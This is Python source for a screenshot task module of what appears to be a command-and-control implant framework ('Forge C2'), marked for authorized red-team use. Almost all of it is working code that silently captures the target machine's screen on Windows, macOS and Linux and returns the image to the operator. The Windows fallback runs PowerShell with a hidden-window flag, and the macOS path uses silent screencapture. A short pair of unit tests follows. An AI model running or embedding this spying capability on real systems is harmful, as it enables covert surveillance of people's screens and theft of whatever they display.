"""
Forge C2 — Screenshot Task
==============================
Capture screenshots on the target system.

Platform support:
    • Windows: native ctypes (BitBlt / GetDIBits)
    • Linux:   xdotool + import, or Pillow
    • macOS:   screencapture utility

Returns screenshot as PNG bytes in TaskResult.data.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import os
import platform
import tempfile
import time
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.screenshot")


@register_task
class ScreenshotTask(BaseTask):
    """Capture a screenshot on the target.

    Args (via kwargs):
        monitor:  Monitor index (0 = primary, -1 = all).
        quality:  JPEG quality (1-100, 0 = PNG format).

    Returns:
        TaskResult with PNG/JPEG data in result.data.

    Usage::

        task = ScreenshotTask(task_id="s1")
        result = await task.execute()
        with open("screenshot.png", "wb") as f:
            f.write(result.data)
    """

    TASK_TYPE = "screenshot"
    DESCRIPTION = "Capture screenshot"
    OPSEC_RISK = "low"

    async def execute(self) -> TaskResult:
        monitor = self.args.get("monitor", 0)
        quality = self.args.get("quality", 0)  # 0 = PNG

        start = time.time()
        system = platform.system()

        try:
            if system == "Windows":
                data = await self._capture_windows(monitor)
            elif system == "Darwin":
                data = await self._capture_macos()
            elif system == "Linux":
                data = await self._capture_linux()
            else:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Unsupported platform: {system}",
                    started_at=start,
                )

            if not data:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error="Screenshot capture returned empty data",
                    started_at=start,
                    completed_at=time.time(),
                )

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=f"Screenshot captured ({len(data)} bytes, {system})",
                data=data,
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "platform": system,
                    "monitor": monitor,
                    "size": len(data),
                    "format": "jpeg" if quality > 0 else "png",
                },
            )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=str(exc),
                started_at=start,
                completed_at=time.time(),
            )

    async def _capture_windows(self, monitor: int = 0) -> bytes:
        """Capture screenshot on Windows using ctypes.

        Uses GDI BitBlt — no external dependencies needed.
        Falls back to PowerShell if ctypes fails.
        """
        try:
            import ctypes
            import ctypes.wintypes
            from ctypes import windll

            # Get screen dimensions
            user32 = windll.user32
            gdi32 = windll.gdi32

            width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
            height = user32.GetSystemMetrics(1)   # SM_CYSCREEN

            # Create device contexts
            hdc_screen = user32.GetDC(0)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
            gdi32.SelectObject(hdc_mem, hbmp)

            # BitBlt screen to memory DC
            gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)

            # Get bitmap bits
            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ("biSize", ctypes.c_uint32),
                    ("biWidth", ctypes.c_int32),
                    ("biHeight", ctypes.c_int32),
                    ("biPlanes", ctypes.c_uint16),
                    ("biBitCount", ctypes.c_uint16),
                    ("biCompression", ctypes.c_uint32),
                    ("biSizeImage", ctypes.c_uint32),
                    ("biXPelsPerMeter", ctypes.c_int32),
                    ("biYPelsPerMeter", ctypes.c_int32),
                    ("biClrUsed", ctypes.c_uint32),
                    ("biClrImportant", ctypes.c_uint32),
                ]

            bmi = BITMAPINFOHEADER()
            bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bmi.biWidth = width
            bmi.biHeight = -height  # Top-down
            bmi.biPlanes = 1
            bmi.biBitCount = 24
            bmi.biCompression = 0

            row_size = ((width * 3 + 3) & ~3)  # DWORD aligned
            img_size = row_size * height
            buffer = ctypes.create_string_buffer(img_size)

            gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buffer, ctypes.byref(bmi), 0)

            # Build BMP file
            bmp_header = (
                b"BM"
                + (54 + img_size).to_bytes(4, "little")
                + b"\x00\x00\x00\x00"
                + (54).to_bytes(4, "little")
            )
            bmi_bytes = bytes(bmi)
            bmp_data = bmp_header + bmi_bytes + buffer.raw

            # Cleanup GDI objects
            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)

            # Try to convert to PNG using Pillow if available
            try:
                from PIL import Image
                import io
                img = Image.open(io.BytesIO(bmp_data))
                png_buf = io.BytesIO()
                img.save(png_buf, format="PNG")
                return png_buf.getvalue()
            except ImportError:
                return bmp_data  # Return BMP if Pillow not available

        except Exception:
            # Fallback: PowerShell screenshot
            return await self._powershell_screenshot()

    async def _powershell_screenshot(self) -> bytes:
        """PowerShell fallback screenshot capture."""
        tmp = Path(tempfile.gettempdir()) / f"forge_ss_{os.getpid()}.png"
        ps_cmd = f"""
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bmp.Save('{tmp}', [System.Drawing.Imaging.ImageFormat]::Png)
$g.Dispose()
$bmp.Dispose()
"""
        proc = await asyncio.create_subprocess_exec(
            "powershell.exe", "-NoProfile", "-Command", ps_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=0x08000000,
        )
        await asyncio.wait_for(proc.communicate(), timeout=30.0)

        if tmp.exists():
            data = tmp.read_bytes()
            tmp.unlink(missing_ok=True)
            return data
        return b""

    async def _capture_macos(self) -> bytes:
        """macOS screenshot using screencapture utility."""
        tmp = Path(tempfile.gettempdir()) / f"forge_ss_{os.getpid()}.png"
        proc = await asyncio.create_subprocess_exec(
            "screencapture", "-x", str(tmp),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.wait_for(proc.communicate(), timeout=15.0)

        if tmp.exists():
            data = tmp.read_bytes()
            tmp.unlink(missing_ok=True)
            return data
        return b""

    async def _capture_linux(self) -> bytes:
        """Linux screenshot using import (ImageMagick) or scrot."""
        tmp = Path(tempfile.gettempdir()) / f"forge_ss_{os.getpid()}.png"

        # Try import (ImageMagick) first
        for tool in ["import -window root", "scrot", "gnome-screenshot -f"]:
            try:
                parts = tool.split()
                cmd = parts + [str(tmp)]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await asyncio.wait_for(proc.communicate(), timeout=15.0)

                if tmp.exists() and tmp.stat().st_size > 0:
                    data = tmp.read_bytes()
                    tmp.unlink(missing_ok=True)
                    return data
            except FileNotFoundError:
                continue

        return b""


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestScreenshotTask:
    """Tests for screenshot task."""

    def test_encode(self) -> None:
        task = ScreenshotTask(task_id="s1", monitor=0)
        encoded = task.encode()
        assert encoded["type"] == "screenshot"

    def test_decode(self) -> None:
        data = {"task_id": "s2", "type": "screenshot", "args": {"monitor": 1}}
        task = ScreenshotTask.decode(data)
        assert task.args["monitor"] == 1
